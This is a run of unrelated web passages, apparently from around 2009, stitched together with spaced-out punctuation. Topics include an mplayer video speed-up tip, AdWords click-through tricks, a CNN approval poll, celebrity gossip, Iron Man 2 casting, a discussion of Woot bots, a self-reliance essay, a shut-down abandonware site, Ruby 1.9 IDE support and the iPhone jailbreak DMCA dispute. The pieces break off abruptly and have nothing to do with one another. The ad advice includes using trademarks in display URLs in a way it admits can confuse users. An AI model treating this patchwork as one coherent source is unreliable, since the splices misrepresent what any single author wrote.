There are three variables that you can change in this simple script .
The first is " file " .
It should be the filename of the video you are about to watch .
The next is " speedup " .
It 's the new playback rate , you may set it to any value you want .
For example , if you set it to 2.0 , then the video will play twice as fast as it normally would .
And the last parameter to change is the " pitch " .
You may change it to something lower than 100 when the video plays at higher speeds to make the speaker sound lower .
I usually keep " speedup " at 1.65 and " pitch " at 75 .
Once you have made your own configuration , just double click the .avs on Windows to play it at the new playback speed , or play it through mplayer on Linux !
Update :
My blog readers bobb and crb suggested two new techniques on how to watch videos faster .
Bobb suggested just to use mplayer .
Turns out it already has an option to play videos faster !
mplayer - speed 1.65 file .avi # use keys [ ] , and { } to control the playback speed # use backspace to reset video speed to normal .
Crb suggested to use MySpeed™ Plug - In for YouTube to speed up video on YouTube in real time .
Here are a few examples that I crafted at speeds 1x , 1.4x , 1.65x , 2x , 2.25 x , 2.5x , 2.75 x and 3 x .
They are from Alan Kay 's keynote speech " The computer revolution has n't happend yet " at OOPSLA Conference in 1997 .
After a few minutes of listening at higher speeds , try going back to listen at 1x .
It will seem incredibly slow because your mind will have adapted to the faster input rate .

In a previous post , I went through some ways you can use “ strong ” words in combination with strong call to action words to improve your PPC click through rate ( CTR ) .
Since that post , there have been some updates to the AdWords quality score algorithm and as such , CTR plays an ever important role .
In fact , it is my opinion that incremental CTR increase is the most important part of any PPC marketing campaign as it is one of the few factors you can directly influence to increase your ad position and reduce your cost per click ( CPC ) .
Remember to always be A/ B split testing your ads and never leave an adgroup with only a single ad .
Below , I outline five examples of ways you can increase your CTR without doing anything technical or magical .
The ads are fabricated but the data is not .
The ads are as close to the original as possible .
Besides , you ’re going to test the theory yourself anyway right ?
1 ) Trademark Symbol / Registered Symbol .
While I have been using this method myself for years , Brad and Amber make some great points on this very topic .
Not only can special symbols be used to increase your PPC CTR , but they can also be used to increase your organic SERP CTR .
I could not agree with Ian Lurie more on his blog post predicting that organic CTR will matter a LOT in 2009 .
2 ) Price In Headline
Adding the price in the headline is a great way to increase CTR .
Be careful with this one though , if you ’re not the cheapest , you ’re CTR will suffer .
3 ) Seasonal Headlines .
Does n’t matter if your product is not seasonal .
If you sell blue widgets all year around , a headline like “ Easter Widget Sale ” will work great .
There are so many different holidays , festivals and events that this can be used with .
If you ’re targeting locally , even better .
4 ) Trademark in Display URL Subdomain
While you ca n’t use most trademark terms in your ad copy , you can use them in your display URL .
Amber has a great post on why AdWords allows trademarks in the display URL here .
Using the trademark in the display URL some argue confuses potential clickers into thinking that it is the “ official ” site of the trademark holder .
Be careful with this one too …
Google knows when a visitor clicks the back button on their browser !
5 ) The exact Keyword in the Headline .
An oldie , but a goodie .
We all know that search engines BOLD your keywords when they match the search query .
Having tightly knit adgroups will allow you to take advantage of this without having to use dynamic keyword insertion .
Remember , CTR for quality score reasons is only calculated on the exact match of the keyword and is only counted on the Google search network .
This means that any increase in CTR from Dynamic Keyword Insertion does not improve your google quality score .
CTR on Google search partners does not contribute to your quality score calculations .

WASHINGTON ( CNN ) --
A national poll indicates that two out of three Americans approve of the way Barack Obama is handling his job as president of the United States .
A poll shows approval of President Obama slipping , but most of the loss of support is among Republicans .
The CNN / Opinion Research Corp. survey , released Friday , also suggests that six in 10 support the economic stimulus package that Obama signed into law Tuesday .
Obama 's approval rating stands at 67 percent in the new poll .
That 's down 9 percentage points from the most recent CNN poll , which was conducted in early February .
But a breakdown by party suggests that the drop does n't mean that the new president is in serious trouble .
" Since nearly all of the decline came among Republicans , this does n't indicate that the honeymoon is already over , " said Keating Holland , CNN 's polling director .
" Among Democrats , Obama 's approval went from 96 percent to 92 percent ; among Republicans , it dropped from 50 percent in early February to 31 percent now . "
Among independents , the president 's approval rating now stands at 61 percent , down 6 percentage points from earlier in the month .
Sixty percent of those questioned in the poll favored the economic stimulus plan , with 39 percent opposing the package .
The $ 787 billion law is designed to pump up the economy by increasing federal government spending , sending aid to states in fiscal trouble and by cutting taxes .
Watch Obama 's comments after signing the stimulus »
Do Americans think the stimulus will work ?
A slight majority , 53 percent , said the plan will improve economic conditions , while 44 percent said it wo n't help stimulate the economy .
And 31 percent of those questioned indicated the package will improve their own financial situation , with two out of three saying the stimulus wo n't help them personally .
" Americans often do n't see a connection between big government programs and their own wallets , " Holland said .
" That 's what makes the various bailout packages such a hard sell with the public , and why the White House might have felt that they needed to include tax cuts in the stimulus package . "
Of those 53 percent who said the plan will work , 19 percent felt it will start improving the economy by the end of the year , with 16 percent saying it will make a difference by next year and another 18 percent feeling it will take longer than two years .
" It goes without saying that Democrats support the stimulus bill and Republicans oppose it , " Holland added .
" Nearly nine in 10 Democrats favored the plan , while three - quarters of Republicans thought it was a bad idea . "
iReport.com : How is Obama doing so far ?
Forty - nine percent said they think the passage of the economic stimulus plan was a major victory for Obama , with 28 percent calling it a minor accomplishment and 22 percent indicating it was not a positive achievement .
The bill passed Congress less than four weeks after Obama took office .
It passed the House of Representatives with no Republican support .
In the Senate , three of 41 Republicans backed the bill .
The survey 's release comes one month after Obama 's inauguration .
Fifty - eight percent of those polled said Obama has so far met their expectations , and another 16 percent suggested that he 's exceeded their expectations .
Nearly one in four said that the president has fallen short of what they expected .
The CNN / Opinion Research poll was conducted Wednesday and Thursday , with 1,046 people questioned by telephone .
The survey 's sampling error is plus or minus 3 percentage points .

Jen Wants Prenup
When will the drama die out ?
Probably never with these two .
Which is great for us because we thrive on this kind of bullshit .
To make a long story short , Jennifer Aniston wants a prenup before hopping into a shaky marriage with singer , John Mayer .
It 's reported , that this brief hiccup is threatening the marriage proposal .
It 's pretty obvious both of these two have issues , but we 're glad Jennifer is taking some sort of initiative to an already botched relationship .
These two should be planning their divorce instead of the wedding .
With the cast list seemingly falling apart in public and the studio apparently forcing actors out due to low pay , is Iron Man 2 becoming the movie that 'll end Marvel 's run of movie successes ?

If nothing else , the increasing to - and - fro surrounding the cast of the sequel to last year 's best superhero movie ( Do n't groan , Dark Knight fans , you know it 's true in your hearts ) is becoming an unexpected black eye on the previously perfect public face of Marvel Studios , which only months ago was looking like one of the most successful independent studios in the business and unable to put a foot wrong .
Perhaps we should have seen the warning signs when Terrence Howard was unceremoniously replaced by Don Cheadle , and Howard 's public confusion over the move was met by somewhat dirty leaks from studio insiders , but even so ; that seemed like a one - time thing at the time , instead of the start of a trend .

Since then , of course , Samuel L. Jackson has hinted that Marvel are not bringing him back to reprise his role as Nick Fury , despite Fury appearing to be central to the planned Avengers movie ( especially if it's as close to Mark Millar 's Ultimates comic as has been rumored ) because of a breakdown in negotiations over money .
Just over a week later , Variety announces that the studio has offered Mickey Rourke a stunningly low $ 250,000 to play one of the two lead villains in Iron Man 2 ... a move that led , earlier this week , to Rourke saying that he would n't be doing the movie after all ( The usual anonymous sources are saying that the deal is n't necessarily dead just yet ) .
Advertisement
Marvel , of course , have n't officially commented on any of these situations - and it's unlikely that they will , particularly as the Rourke and Jackson negotiations are still , officially at least , ongoing - but the fact remains that Iron Man 2 is beginning to look like a movie that 's being hamstrung by accountants with their eyes staring a little too intently on the bottom line .
This is n't exactly news - director and co-writer Jon Favreau has also complained about being lowballed by the studio in their initial offer to sign him for the sequel - but at this point , it 's getting embarrassing for Marvel ; the only actor who 's not complained about the progress of the movie has been Robert Downey Jr. himself ( Gwyneth Paltrow has griped about not having seen a script yet , and the production seems to be having trouble keeping the love interest that they cast ... but at least neither of those are money - related ) .
Advertisement
We 're still a year away from the release of the movie - Iron Man 2 is scheduled to open May next year ( Although , let 's face it , that date may end up being as unrealistic as Favreau publicly declared it when it was first announced ) - but that does n't change the fact that Marvel needs to either start coughing up some more money for this movie - and considering the first made close to $ 600 million , that should n't be too much of a struggle - or else start putting together a more convincing PR push to explain that everything 's going to be alright in the end .

The method Woot uses to combat this issue is changing the game - literally .
When they present an extraordinarily desirable item for sale , they make users play a video game in order to order it .
Not only does that successfully combat bots ( they can easily make minor changes to the game to avoid automatic players , or even provide a new game for each sale ) but it also gives the impression to users of " winning " the desired item while slowing down the ordering process .
It still sells out very quickly , but I think that the solution is good - re-evaluating the problem and changing the parameters led to a successful strategy where strictly technical solutions simply did n't exist .
Your entire business model is based on " first come , first served . "
You ca n't do what the radio stations did ( they no longer make the first caller the winner , they make the 5th or 20th or 13th caller the winner ) - it does n't match your primary feature .
No , there is no way to do this without changing the ordering experience for the real users .
Let 's say you implement all these tactics .
If I decide that this is important , I 'll simply get 100 people to work with me , we 'll build software to work on our 100 separate computers , and hit your site 20 times a second ( 5 seconds between accesses for each user / cookie / account / IP address ) .
You have two stages :
Watching front page Ordering
You can't put a captcha blocking # 1 - that 's going to lose real customers ( " What ?
I have to solve a captcha each time I want to see the latest woot ?!? " ) .
So my little group watches , timed together so we get about 20 checks per second , and whoever sees the change first alerts all the others ( automatically ) , who will load the front page once again , follow the order link , and perform the transaction ( which may also happen automatically , unless you implement captcha and change it for every wootoff / boc ) .
You can put a captcha in front of # 2 , and while you 're loathe to do it , that may be the only way to make sure that even if bots watch the front page , real users are getting the products .
But even with captcha my little band of 100 would still have a significant first mover advantage - and there 's no way you can tell that we are n't humans .
If you start timing our accesses , we 'd just add some jitter .
We could randomly select which computer was to refresh so the order of accesses changes constantly - but still looks enough like a human .
First , get rid of the simple bots
You need to have an adaptive firewall that will watch requests and if someone is doing the obvious stupid thing - refreshing more than once a second at the same IP then employ tactics to slow them down ( drop packets , send back refused or 500 errors , etc ) .
This should significantly drop your traffic and alter the tactics the bot users employ .
Second , make the server blazingly fast .
You really do n't want to hear this ... but ...
I think what you need is a fully custom solution from the bottom up .
You do n't need to mess with TCP / IP stack , but you may need to develop a very , very , very fast custom server that is purpose built to correlate user connections and react appropriately to various attacks .
Apache , lighthttpd , etc are all great for being flexible , but you run a single purpose website , and you really need to be able to both do more than the current servers are capable of doing ( both in handling traffic , and in appropriately combating bots ) .
By serving a largely static webpage ( updates every 30 seconds or so ) on a custom server you should not only be able to handle 10 x the number of requests and traffic ( because the server is n't doing anything other than getting the request , and reading the page from memory into the TCP / IP buffer ) but it will also give you access to metrics that might help you slow down bots .
For instance , by correlating IP addresses you can simply block more than one connection per second per IP .
Humans can't go faster than that , and even people using the same NATed IP address will only infrequently be blocked .
You 'd want to do a slow block - leave the connection alone for a full second before officially terminating the session .
This can feed into a firewall to give longer term blocks to especially egregious offenders .
But the reality is that no matter what you do , there 's no way to tell a human apart from a bot when the bot is custom built by a human for a single purpose .
The bot is merely a proxy for the human .
Conclusion
At the end of the day , you can't tell a human and a computer apart for watching the front page .
You can stop bots at the ordering step , but the bot users still have a first mover advantage , and you still have a huge load to manage .
You can add blocks for the simple bots , which will raise the bar and fewer people with bother with it .
That may be enough .
But without changing your basic model , you 're out of luck .
The best you can do is take care of the simple cases , make the server so fast regular users do n't notice , and sell so many items that even if you have a few million bots , as many regular users as want them will get them .
You might consider setting up a honeypot and marking user accounts as bot users , but that will have a huge negative community backlash .
Every time I think of a " well , what about doing this ... "
I can always counter it with a suitable bot strategy .
Even if you make the front page a captcha to get to the ordering page ( " This item 's ordering button is blue with pink sparkles , somewhere on this page " ) the bots will simply open all the links on the page , and use whichever one comes back with an ordering page .
That 's just no way to win this .
Make the servers fast , put in a reCaptcha ( the only one I 've found that can't be easily fooled , but it 's probably way too slow for your application ) on the ordering page , and think about ways to change the model slightly so regular users have as good a chance as the bot users .
- Adam
Millions stowed their savings away in mutual funds , houses , and other investments only to find their retirement nest eggs wiped away in a matter of weeks .
Over the last few months , we have watched in disbelief as the federal government has done nothing to stop it .
Now , as wave after wave of layoffs hit our TV screens , we feel more helpless than ever .
The awful truth that should be dawning on us right now is that the institutions we trust to provide us with stability and prosperity are flawed and frail .
When it comes down to it , we cannot rely on government , companies , banks , or markets to save us , as much as we 've come to depend on them .
Who can we rely on ?
Ourselves .
This recession should be a wake - up call to all of us to return to self - reliance .
If you think about it , who 's really in charge of making sure you have food , water , shelter , and safety ?
Is it really some group of rich guys in a big shiny building thousands of miles away who do n't know you from Adam and really could care less about your needs ?
Are they really the guys you should be trusting with your life ?
The answers are you , no , and no .
Just to remind those who may not know what self - reliance is , the best way to understand it is to imagine what would happen if all of the systems you currently rely on for the necessities of life suddenly disappeared .
What if water no longer came out of the tap ?
What if there were no more grocery stores stocked with food ?
What if you could n't buy new clothes at the store ?
The next question is : how would you make sure you and your loved ones had all the necessities of life in that situation ?
Dedicated practitioners of self - reliance grow their own gardens , sew and mend clothes , learn carpentry and minor repair skills , and store a little extra food for emergencies .
Some even learn wilderness survival and purchase durable , long - term camping gear .
Although you may not want to go as far as these individuals , a little self - reliance is a great way to buffer your household against the effects of recession .
For instance , put away a little food storage - you never know when food prices might skyrocket again .
Also , keep first aid supplies on hand and know how to use them , in case you have an emergency to which 911 can't respond .
Bottom line : learn to cover your back .
Learn a trade .
Put a little money , food , and supplies away for a rainy day .
Hope for the best .
But be prepared for the worst .
Home of the Underdogs is dead , long live to vintage videogaming .
It ’s unlikely that memorial words will be wasted in the IT industry for the occasion , nevertheless the event is worth highlighting : founded by the Thai woman Sarinee Achavanuntakul in September 1998 , HotU eventually became the largest historic videogames archive ( mostly ) for DOS and Windows platforms , representing one of the major landfall points of the phenomenon at the boundary between illegality and collective cognizance better known as abandonware .
It was the site owner herself to announce , with a short message on Twitter , that the hosting company managing the HotU server was gone bankrupt cutting off the plug from the site .
In its golden age , the portal was grown up to include 5,263 games , 40 applications and 1,348 manuals , and even though it had n’t been updated since 2006 , HotU continued to be a valuable resource from which to get unknown gems and great classics from the past , in the last months appreciated mainly for the information available for any game , the forum , the titles sorting and more generally for the record part of the archive .
Considering that Achavanuntakul , an Harvard graduated , is currently interested to rather different issues compared to videogames still protected by copyright but that no one is selling anymore , it ’s difficult that the aforementioned information archive could magically reappear on - line on a new web host .
And it ’s similarly improbable that the overall abandonware phenomenon will be influenced in a noticeable manner , being the list of dedicated sites very well furnished and not being lacking the archives overflowing information on everything is classic gaming .
But a fact remains and must be underlined : if today there are services like Good Old Games , the digital delivery store of DOS and Windows historic videogames , and if the awareness of how important is to preserve humanity digital heritage makes its way in the academy and society , a non trivial part of the credit must be acknowledge to whom , like Sarinee Achavanuntakul and the contributors of the deceased Home of the Underdogs , began to think in terms of videogame archiving way before the so called experts , the researchers and the universities of the most advanced countries .

With Ruby 1.9.1 , the first stable version of the 1.9 series has been released and will certainly be adopted by numerous Ruby programmers .
Ruby 1.9 introduced many semantic changes and even new syntax , which IDEs need to be able to handle .
We conducted a survey among the major Ruby IDEs to find out which ones are 1.9 capable and what their plans are .
Ruby in Steel
Huw Collingbourne from SapphireSteel Software answered :
[..] we have been pretty aggressive in supporting flavours of Ruby including JRuby the alphas of IronRuby .
We are naturally keeping a close eye on the development of Ruby 1.9 as it migrates towards Ruby 2.0 and we will support this when our customers request us to .
Currently our customers tell us that they are using Ruby 1.8 x and we have not received requests for support of Ruby 1.9 .
NetBeans
Erno Mononen from Sun :
Full Ruby 1.9 support is coming in the next release of NetBeans Ruby IDE .
Currently there is some limited support for it - you can develop with Ruby 1.9 in the IDE , i.e. the IDE accepts it as a Ruby platform and there are even some 1.9 specific hints , but we have n't yet switched the parser to the latest JRuby that brings full 1.9 support .
In addition , the debugger is not compatible with 1.9 ( this is not really specific to NB since ruby - debug - base is not yet 1.9 ready ) .
RubyMine
Dmitry Jemerov from JetBrains :
At the moment RubyMine does not support Ruby 1.9 .
Our main focus at the moment is getting out a solid and stable RubyMine 1.0 release supporting Ruby 1.8 .
We plan to add Ruby 1.9 support in a subsequent version of RubyMine after 1.0 ( most likely in Q2'2009 ) .
RadRails
Chris Williams from Aptana :
We have upgraded the included JRuby to 1.1.6 in our upcoming release and they 've started working towards 1.9 compatibility in both parsing and execution , so we 'll be getting that as a result of their work .
And of course users can point RDT / RadRails as a 1.9 install as the interpreter they want to use .
We 've also had in code checks / warnings related to deprecated syntax that will be changed or removed in Ruby 1.9 ( to help developers avoid using syntax that wo n't work going forward ) .
But I have n't had time to extensively test how we handle 1.9's new syntax changes with regard to syntax checking / error markers and I imagine we mark use of any new syntax introduced in 1.9 as a syntax error for now ( and still only mark removed syntax from 1.8 to 1.9 as warnings , though the user can change the priority level to show as an error ) .
It seems that some IDEs are on their way providing Ruby 1.9 support .
Are you already using 1.9 ?
If not , is it because your IDE of choice lacks support for it ?
Every three years , the Copyright Office hosts a rulemaking in which it considers specific exemptions to the Digital Millennium Copyright Act's ( DMCA ) rules against circumventing DRM , and the comments are now in for the current round .
This year , the Electronic Frontier Foundation has pushed hard for an exemption on jailbreaking the Apple iPhone , allowing people to install and run applications of their choice that do n't come from the official App Store .
Now , Apple has responded with a ringing defense of DRM and its business practices , siding with groups like the MPAA and RIAA against exemptions .
Jailbreak !
Fred von Lohmann of the EFF asked the Copyright Office for three exemptions , the first of which was for " computer programs that enable wireless telephone handsets to execute lawfully obtained software applications , where circumvention is accomplished for the sole purpose of enabling interoperability of such applications with computer programs on the telephone handset . "
In other words , jailbroken phones .
And not just any phone — iPhones are the real target here .
In the follow - up explanation , von Lohmann claimed that " Apple imposes arbitrary , anti-competitive restrictions on independent iPhone developers . "
The main point was that Apple 's use of iPhone DRM has less to do with " copyright " than with simple control over the device , and the iPhone might therefore be a good target for a DMCA exemption ( which are only granted if DRM is blocking noninfringing uses of the product in question ) .
Apple comments hit back hard at the entire complaint , saying that " Congress did not envision the DMCA exemption process as a forum for economic restructuring of business models ...
As this submission will demonstrate , the evidence shows that a business model in which handsets can be widely jailbroken with the attendant problems that result would in fact hinder the creation and distribution of creative works for the platform . "
Whatever you think of the merits of Apple 's system , the company claims that the exemption challenge fails for one key reason : the uses that are sought of its DRM - protected firmware and bootloader do in fact infringe its copyright .
" Here , the uses of the class of works that would result from the proposed exemption are infringing , namely , the creation of unauthorized derivative versions of Apple 's copyrighted bootloader and iPhone operating system software , " writes Apple .
" This fact alone must result in denial of the exemption . "
Besides , why would anyone want to remove the DRM ?
It protects the OS against modifications , and modifications are dangerous .
" If modifications of the the OS were to interfere with these control functions [ volume governors , temperature sensors , charging circuitry ] , even unintentionally , the phone could be physically damaged or the battery could be overcharged . "
A bit later we learn that modifications to the OS might affect the baseband processor , which in turn could even " cause operational damage to the [ cell ] network . "
And , of course , iPhone DRM prevents piracy .
While Apple programs like Texas Hold ' Em are regularly cracked by pirates , the cracked files can only be run on jailbroken iPhones .
" Apple believes that the proposed exemption would further facilitate and encourage this form of piracy . "
von Lohmann has already responded , and he does n't think much of Apple 's arguments .
When it comes to the claim that all jailbroken phones use a modified bootloader and therefore violate Apple 's copyright , von Lohmann says that it's " true enough , " but also that " the courts have long recognized that copying software while reverse engineering is a fair use when done for purposes of fostering interoperability with independently created software , a body of law that Apple conveniently fails to mention . "
One need only transpose Apple 's arguments to the world of automobiles to recognize their absurdity .
The other arguments are all called " FUD " ( fear , uncertainty , doubt ) .
" One need only transpose Apple 's arguments to the world of automobiles to recognize their absurdity , " von Lohmann says .
" Sure , GM might tell us that , for our own safety , all servicing should be done by an authorized GM dealer using only genuine GM parts .
Toyota might say that swapping your engine could reduce the reliability of your car .
And Mazda could say that those who throw a supercharger on their Miatas frequently exceed the legal speed limit .
" But we 'd never accept this corporate paternalism as a justification for welding every car hood shut and imposing legal liability on car buffs tinkering in their garages .
After all , the culture of tinkering ( or hacking , if you prefer ) is an important part of our innovation economy . "
Slipping down the slippery slope
Those who control and enforce copyrights do n't tend to like limitations or exemptions putting a crimp in their style , and this rulemaking is no exception .
A joint group of copyright holders that included the ESA , MPAA , and RIAA also filed a motion that takes aim at other proposed exemptions .
The group 's main beef is with the idea that an exemption should apply to a certain group of people rather than to a certain group of work .
One strategy pursued by those seeking exemptions has been to claim that that DRM circumvention should be allowed by " academic researchers , " for instance , or anyone doing the circumvention for fair use of the content .
But the DMCA itself talks about a " particular class of works , " not of users accessing the works .
Unfortunately for the rightsholders , during the 2006 rulemaking , the Register of Copyrights decided that , in some cases , the " class of users " approach would actually be acceptable .
That led the rightsholders to say , this time around , that " the approach adopted by the Register and ratified by the Librarian [ of Congress ] in 2006 has positioned this proceeding at the edge of a foreseeable slippery slope .
Some of the current crop of proposals would push the proceeding headlong down it .
If unchecked , this momentum will culminate in demands for exemptions for acts of circumvention of access controls on any and all types of works if carried out by favored groups of users ' for fair use purposes . ' "
The EFF asked for exactly this sort of exemption ; needless to say , it 's being strongly opposed by rightsholders .
As for making backups of your DVDs , do n't hold your breath .
The DVD Copy Control Association made clear that even after widespread cracking of DVD 's CSS control mechanism , it is still out to make it as difficult as possible for people to exercise their fair use rights .
Educators , for instance , who are n't film professors do n't need an expanded exemption for creating " clip compilations " for use in the classroom because ( really ) a )
Pioneer makes two models of DVD players that make this possible without breaking CSS , b ) teachers can simply tape the clips in question off a TV screen or computer monitor with a camcorder , and c ) teachers could really just " plan their courses in advance and seek permission from the movie studies to use certain clips . "
The fear in all such cases is of the slippery slope .
As the DVD CCA puts it , " permitting circumvention of CSS to enable the creation of clip compilations would expose the CSS technical and legal protection regime to possible undermining for purposes far beyond those proposed in the exemption request .
Once the technology is legally circumvented , the ability to limit the scope of the use of the circumvention may well be impossible , thereby undermining the whole system . "
